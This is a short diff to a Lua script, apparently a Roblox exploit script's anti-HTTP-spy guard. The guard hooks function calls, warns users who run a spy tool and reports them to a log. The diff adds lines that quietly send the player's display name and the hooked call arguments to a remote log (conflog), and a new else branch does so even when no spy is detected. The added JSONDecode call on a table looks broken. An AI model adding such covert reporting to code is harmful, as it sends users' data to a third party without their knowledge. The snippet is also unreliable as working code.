@@ -453,7 +453,10 @@ for i, v in next,expfunctions do
                 for i,v in next,args do
                     if tostring(i):find("https") or tostring(v):find("https") then
                         SendMessageEMBED(spylog,spyembed)
+			SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
 			lib:WarnUser("VSP [ Vanguard Script Protection ]\nVanguard has detected http spy, please turn off http spy to continue using this script.",{AutoClose = true,CanClick = false,Duration = 9e9})
+		    else
+			SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
                     end
                 end
                 return old(...)
